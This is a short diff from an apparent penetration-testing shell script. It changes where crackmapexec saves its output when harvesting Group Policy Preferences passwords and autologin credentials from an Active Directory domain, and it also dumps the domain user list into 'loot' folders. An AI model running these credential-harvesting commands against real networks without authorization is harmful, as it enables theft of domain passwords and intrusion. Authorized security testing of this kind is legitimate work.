@@ -81,10 +81,10 @@ if [ -z $HASH ]
 then
  # Use Password
  # GPP password
-    crackmapexec smb $IP -u $USER -p $PASS -d $DOM -M gpp_password >> /root/output/loot/intern/ad/gpp_password
+    crackmapexec smb $IP -u $USER -p $PASS -d $DOM -M gpp_password >> /root/output/loot/intern/ad/gpp_password/pass.txt
 
  # GPP autologin
-    crackmapexec smb $IP -u $USER -p $PASS -d $DOM -M gpp_autologin >> /root/output/loot/intern/ad/gpp_autologin
+    crackmapexec smb $IP -u $USER -p $PASS -d $DOM -M gpp_autologin >> /root/output/loot/intern/ad/gpp_autologin/login.txt
 exit 0
  # User txt from DC
     crackmapexec smb $IP -u $USER -p $PASS -d $DOM --users > /root/output/list/raw.txt
